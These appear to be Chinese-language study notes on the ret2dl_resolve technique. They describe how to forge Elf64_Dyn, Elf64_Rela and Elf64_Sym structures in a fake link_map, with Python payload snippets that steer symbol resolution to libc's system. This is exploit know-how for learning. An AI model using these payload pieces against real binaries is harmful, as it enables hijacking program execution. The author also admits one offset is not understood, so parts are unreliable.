# 需要构造的内容
1、Dyn结构体
其中有d-tag和d_ptr
d_tag：没有用 设0
d_ptr：指向伪造的Elf64_Rela结构体
d-ptr = p64(fake_link_map_addr + 0x18) 

```
fake_Elf64_Dyn = b""
fake_Elf64_Dyn += p64(0)    #d_tag  从link_map中找.rel.plt不需要用到标签， 随意设置
fake_Elf64_Dyn += p64(fake_link_map_addr + 0x18)  #d_ptr  指向伪造的Elf64_Rela结构体，由于reloc_offset也被控制为0，不需要伪造多个结构体
```


2、Elf64_Rela结构体
背下来这句话：
`*rel_addr = l->addr + reloc_offset*`
```
r_offset: p64(fake_link_map_addr - offset)
r_offset用于保存解析后的符号地址写入内存的位置（绝对地址）(offset指的是system - __libc_start_main)
r_info: 7
r_addend: 0
```

```
offset = 0x24c50    # system - __libc_start_main
fake_Elf64_Rela = b""
fake_Elf64_Rela += p64(fake_link_map_addr - offset)  # r_offset rel_addr = l->addr+reloc_offset，直接指向fake_link_map所在位置令其可读写就行
fake_Elf64_Rela += p64(7)               # r_info index设置为0，最后一字节必须为7
fake_Elf64_Rela += p64(0)               # r_addend  随意设置
```

3、Elf64_Sym
st_name:随意设置 0
st_info, st_other, st_shndx st_other非0以避免进入重定位符号的分支 b'AAAA'
st_value 已解析函数的got表地址-8
st_size 随意设置 0
```
fake_Elf64_Sym = b""
fake_Elf64_Sym += p32(0)                # st_name 随意设置
fake_Elf64_Sym += b'AAAA'                # st_info, st_other, st_shndx st_other非0以避免进入重定位符号的分支
fake_Elf64_Sym += p64(main_got-8)       # st_value 已解析函数的got表地址-8，-8体现在汇编代码中，原因不明
fake_Elf64_Sym += p64(0)                # st_size 随意设置
```
